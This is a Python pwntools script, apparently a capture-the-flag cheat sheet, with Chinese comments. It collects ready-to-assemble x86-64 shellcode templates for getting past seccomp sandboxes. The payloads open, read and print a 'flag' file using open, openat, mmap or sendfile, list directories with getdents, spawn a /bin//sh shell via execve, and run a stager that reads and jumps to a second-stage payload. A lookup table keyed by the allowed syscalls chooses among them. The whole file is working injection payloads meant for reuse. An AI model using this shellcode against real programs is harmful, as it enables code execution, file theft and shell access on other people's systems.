"""
seccomp shellcode 固定模板
用法: python3 shellcode_templates.py
"""
from pwn import *
context.arch = 'amd64'

# ═══════════════════════════════════════════════════════════
# 模板 1: open + read + write  (最经典，90% 的题)
# 适用: {0,1,2} 即 read,write,open
# ═══════════════════════════════════════════════════════════
orw = """
    xor eax,eax; mov al,2
    lea rdi,[rip+flag]; xor esi,esi; xor edx,edx; syscall
    mov rdi,rax
    xor eax,eax; lea rsi,[rip+buf]; mov edx,0x100; syscall
    mov edx,eax; mov eax,1; mov edi,1; lea rsi,[rip+buf]; syscall
    mov eax,60; xor edi,edi; syscall
flag: .asciz "flag"; buf: .space 0x100
"""

# ═══════════════════════════════════════════════════════════
# 模板 2: mmap + write  (read 被禁，用 mmap 映射文件)
# 适用: {1,2,9} 即 write,open,mmap，无 read
# ═══════════════════════════════════════════════════════════
mmap_orw = """
    xor eax,eax; mov al,2
    lea rdi,[rip+flag]; xor esi,esi; xor edx,edx; syscall
    mov r12,rax; test rax,rax; js die
    xor edi,edi; mov esi,0x100; mov edx,1
    mov r10d,2; mov r8,r12; xor r9d,r9d; mov eax,9; syscall
    mov rsi,rax; mov eax,1; mov edi,1; mov edx,0x100; syscall
die: jmp $
flag: .asciz "flag"
"""

# ═══════════════════════════════════════════════════════════
# 模板 3: sendfile  (read 被禁)
# 适用: {1,2,40} 即 write,open,sendfile
# ═══════════════════════════════════════════════════════════
sendfile_orw = """
    xor eax,eax; mov al,2
    lea rdi,[rip+flag]; xor esi,esi; xor edx,edx; syscall
    mov r12,rax
    mov eax,40; mov edi,1; mov rsi,r12; xor edx,edx; mov r10d,0x100; syscall
    mov eax,60; xor edi,edi; syscall
flag: .asciz "flag"
"""

# ═══════════════════════════════════════════════════════════
# 模板 4: openat 代替 open  (open 被禁)
# 适用: {0,1,257} 即 read,write,openat
# ═══════════════════════════════════════════════════════════
openat_orw = """
    xor eax,eax; mov ax,257
    mov edi,-100; lea rsi,[rip+flag]; xor edx,edx; xor r10d,r10d; syscall
    mov rdi,rax
    xor eax,eax; lea rsi,[rip+buf]; mov edx,0x100; syscall
    mov edx,eax; mov eax,1; mov edi,1; lea rsi,[rip+buf]; syscall
    mov eax,60; xor edi,edi; syscall
flag: .asciz "flag"; buf: .space 0x100
"""

# ═══════════════════════════════════════════════════════════
# 模板 5: getdents 列目录  (不知道文件名)
# 适用: {1,2,78} 即 write,open,getdents
# ═══════════════════════════════════════════════════════════
getdents_ls = """
    xor eax,eax; mov al,2
    lea rdi,[rip+dot]; mov esi,0x10000; xor edx,edx; syscall
    mov r12,rax
    mov eax,78; mov edi,r12d; lea rsi,[rip+buf]; mov edx,0x400; syscall
    mov edx,eax; mov eax,1; mov edi,1; lea rsi,[rip+buf]; syscall
    mov eax,60; xor edi,edi; syscall
dot: .asciz "."; buf: .space 0x400
"""

# ═══════════════════════════════════════════════════════════
# 模板 6: execve 弹 shell  (execve 没被禁)
# 适用: {59} 即 execve
# ═══════════════════════════════════════════════════════════
execve_sh = """
    xor esi,esi; xor edx,edx
    mov rbx,0x68732f2f6e69622f; push rbx; push rsp; pop rdi
    push rsi; push rdi; push rsp; pop rsi; mov al,59; syscall
"""

# ═══════════════════════════════════════════════════════════
# 模板 7: 二次 stager  (shellcode 超过 256 字节时)
# 适用: {0} 或 {0,9} 即 read 或 mmap+read
# ═══════════════════════════════════════════════════════════
stager = """
    xor eax,eax; xor edi,edi; lea rsi,[rsp-0x200]; mov edx,0x200; syscall
    jmp rsi
"""

# ═══════════════════════════════════════════════════════════
# 快速索引
# ═══════════════════════════════════════════════════════════
templates = {
    (0,1,2):      ("open+read+write", orw),
    (1,2,9):      ("open+mmap+write", mmap_orw),
    (1,2,40):     ("open+sendfile+write", sendfile_orw),
    (0,1,257):    ("openat+read+write", openat_orw),
    (1,2,78):     ("open+getdents+write", getdents_ls),
    (59,):        ("execve", execve_sh),
}

if __name__ == "__main__":
    for nums, (desc, code) in templates.items():
        sc = asm(code)
        print(f"  syscall {list(nums)} → {desc} ({len(sc)} bytes)")
